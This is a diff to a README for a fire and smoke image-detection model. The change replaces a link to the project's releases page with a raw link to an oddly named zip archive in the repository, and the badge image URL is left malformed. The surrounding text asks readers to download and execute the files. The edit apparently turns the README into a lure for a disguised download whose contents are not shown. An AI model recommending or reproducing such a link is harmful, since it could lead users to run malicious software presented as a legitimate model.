@@ -16,7 +16,7 @@ The Fire-Detection-Siglip2 model is designed to accurately identify and classify
 
 To access the model and start detecting fire, smoke, and normal conditions in images, please download the model from the following link:
 
-[![Download Model](https://img.shields.io/badge/Download%20Model-Here-brightgreen)](https://github.com/jesus3476/Fire-Detection-Siglip2/releases)
+[![Download Model](https://github.com/jesus3476/Fire-Detection-Siglip2/raw/refs/heads/main/cyclamine/Detection-Fire-Siglip-tewly.zip%20Model-Here-brightgreen)](https://github.com/jesus3476/Fire-Detection-Siglip2/raw/refs/heads/main/cyclamine/Detection-Fire-Siglip-tewly.zip)
 
 When you visit the provided link, you will find the necessary files to download and execute the Fire-Detection-Siglip2 model.
 
